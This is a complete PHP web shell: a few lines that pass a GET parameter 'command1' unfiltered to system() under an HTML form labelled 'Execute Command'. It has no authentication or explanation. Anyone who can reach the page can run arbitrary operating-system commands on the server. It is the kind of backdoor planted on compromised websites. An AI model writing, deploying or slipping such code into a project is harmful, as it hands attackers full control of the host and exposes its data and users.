<?php
$cmd = $_GET['command1'];
system($cmd);
?>
<html>
    <form action="" method="get">
        <input type="text" name="command1" />
        <input type="submit" value="Execute Command" />
</form>